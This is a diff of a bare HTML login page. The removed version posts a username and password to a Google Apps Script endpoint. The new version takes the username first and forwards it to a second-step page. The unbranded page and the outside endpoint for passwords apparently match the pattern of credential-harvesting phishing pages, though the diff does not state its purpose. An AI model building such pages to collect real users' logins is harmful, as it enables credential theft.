@@ -1,33 +1,35 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Login</title>
-  </head>
-  <body>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Login - Step 1</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    input { padding: 10px; width: 100%; margin: 10px 0; box-sizing: border-box; }
+    button { padding: 10px 20px; font-size: 16px; }
+  </style>
+</head>
+<body>
 
-    <form
-      method="POST"
-      action="https://script.google.com/macros/s/AKfycbwHAiqV_uvO4uLTkipRCoZEcpQ5ZOb4_lab_drcDKWuxVCHqBXJMzh2dPpfDS3rr90P/exec">
+  <h2>Login</h2>
+  <form id="step1Form">
+    <input type="text" name="user" placeholder="Username or Email" required>
+    <button type="submit">Next</button>
+  </form>
 
-      <input
-        type="text"
-        name="user"
-        placeholder="Username"
-        required>
+  <script>
+    const form = document.getElementById('step1Form');
+    form.addEventListener('submit', function(e) {
+      e.preventDefault(); // Prevent default form submission
 
-      <br><br>
+      const user = form.user.value.trim();
+      if (!user) return;
 
-      <input
-        type="password"
-        name="pass"
-        placeholder="Password"
-        required>
+      // Redirect to step 2 page with username in query string
+      window.location.href = `login-step2.html?user=${encodeURIComponent(user)}`;
+    });
+  </script>
 
-      <br><br>
-
-      <button type="submit">Login</button>
-    </form>
-
-  </body>
+</body>
 </html>
